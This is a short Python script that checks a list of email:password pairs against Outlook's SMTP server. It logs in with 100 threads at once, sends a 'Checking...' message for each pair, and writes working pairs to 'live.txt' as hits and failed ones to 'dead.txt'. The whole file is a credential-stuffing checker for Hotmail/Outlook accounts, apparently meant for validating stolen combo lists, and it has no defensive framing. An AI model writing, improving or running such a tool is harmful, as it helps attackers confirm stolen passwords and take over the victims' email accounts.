import smtplib
import traceback
import concurrent.futures

live = open('live.txt', 'w')
dead = open('dead.txt', 'w')

def check(subject, body, to_email, sender_email, sender_password):
    try:
        message = f"Subject: {subject}\n\n{body}"
        smtp_server = "smtp-mail.outlook.com"
        smtp_port = 587
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, to_email, message)
        server.quit()

        return None
    except smtplib.SMTPAuthenticationError:
        return "Authentication failed."
    except Exception as e:
        error_message = f"{str(e)}\n{traceback.format_exc()}"
        return error_message
    
def check_emailpass(emailpass):
    global live
    global dead
    e = str(emailpass).split(':')
    c = check('Checking...', 'Checking...', e[0], e[0], e[1])
    if c is None:
        with open('live.txt', 'a') as file:
            file.write(emailpass)
        return 'Hit', emailpass
    else:
        with open('dead.txt', 'a') as file:
            file.write(emailpass)
        return 'Dead', c

def process_hotmail(file_content):
    emails = file_content.splitlines()
    hits = []
    dead = []
    total = len(emails)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
        results = list(executor.map(check_emailpass, emails))
    
    for result in results:
        status, message = result
        if status == 'Hit':
            hits.append(message)
        else:
            dead.append(message)
    
    return total, len(hits), len(dead)
